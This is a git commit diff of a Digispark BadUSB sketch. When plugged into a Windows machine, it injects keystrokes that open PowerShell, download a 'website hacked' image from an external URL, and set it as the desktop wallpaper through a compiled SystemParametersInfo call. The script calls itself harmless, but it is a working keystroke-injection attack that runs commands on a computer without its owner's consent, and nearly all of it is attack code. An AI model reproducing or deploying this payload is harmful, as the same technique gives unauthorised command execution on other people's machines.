52c44347b8852217faddde5ef99a2adb0a10cb27
Narwhal <aena@digitisedgarden.com>
2025-05-11 17:14:04 +0800

    Changed files: - scripts/Wallpaper_Change.ino     - Changed the wallpaper to a new image     - Modified input commands to load as flash memory.

--- scripts/Wallpaper_Change.ino
+++ scripts/Wallpaper_Change.ino
@@ -1,7 +1,8 @@
 /*
-Superbly harmless. It just changes the background image to a chosen image. You can pick whatever image you want! Hace Fun!
+Superbly harmless. It just changes the background image to a chosen image. You can pick whatever image you want! Have Fun!
 */
 #include "DigiKeyboard.h"
+
 void setup() {
 }
 
@@ -12,27 +13,42 @@ void loop() {
 
   /* Change Wallpaper */
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(2500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(750);
-  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print(F("powershell"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(750);
-  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print(F("$client = new-object System.Net.WebClient"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(750);
-  DigiKeyboard.print("$client.DownloadFile(\"https://mailprotector.com/wp-content/uploads/2021/11/website-hacked-mailprotector-wordpress-scaled.jpg\" , \"hacked.jpg\")"); // Random hacked image downloaded.
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print(F("$client.DownloadFile(\"https://mailprotector.com/wp-content/uploads/2021/11/website-hacked-mailprotector-wordpress-scaled.jpg\" , \"hacked.jpg\")"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(750);
-  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hacked.jpg\" /f");
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(2500);
+
+  DigiKeyboard.print(F("Add-Type -TypeDefinition @\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(750);
-  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.print(F("using System; using System.Runtime.InteropServices;"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.print(F("public class Wallpaper {"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("[DllImport(\"user32.dll\", CharSet= CharSet.Auto)]"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("}"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("\"@"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print(F("[Wallpaper]::SystemParametersInfo(0x0014, 0, \"$env:USERPROFILE\\hacked.jpg\", 0x01 -bor 0x02)"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2500);
+
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   for (;;) {
-    /*Stops the digispark from running the scipt again*/
+    // Stops the digispark from running the script again
   }
 }
